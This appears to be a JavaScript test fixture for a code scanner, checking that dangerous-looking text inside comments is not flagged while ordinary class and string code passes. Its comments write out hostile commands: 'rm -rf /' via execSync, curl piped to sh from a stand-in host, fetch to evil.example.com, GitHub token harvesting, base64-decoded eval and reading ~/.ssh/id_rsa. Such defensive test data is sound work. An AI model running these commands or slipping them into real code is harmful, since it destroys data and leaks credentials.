// FIXTURE clean: dangerous tokens appear ONLY inside comments, so nothing flags.
// Do NOT use eval() here, and never call child_process.execSync('rm -rf /').
// Avoid fetch('https://evil.example.com') and process.env.GITHUB_TOKEN harvesting.
/*
 * Historical note: an earlier draft did `await fetch(url)` and
 * `const p = Buffer.from(blob, 'base64'); eval(p);` and
 * `globalThis['ev' + 'al'](payload)` — all REMOVED, kept here only as prose.
 * Also we used to `curl https://x.example.com | sh` and read ~/.ssh/id_rsa.
 */
import path from 'node:path'; // path.join is fine; the // comment after is stripped

/** Private field use of `#` must NOT be read as a shell comment. */
class Counter {
  #count = 0;
  bump() {
    this.#count += 1; // bump the private field; trailing comment is stripped
    return this.#count;
  }
}

export function describe(n) {
  // A URL fragment inside a STRING literal stays intact and is harmless prose:
  const help = 'See https://example.com/docs#install for setup details.';
  return new Counter().bump() + path.basename(help) + n;
}
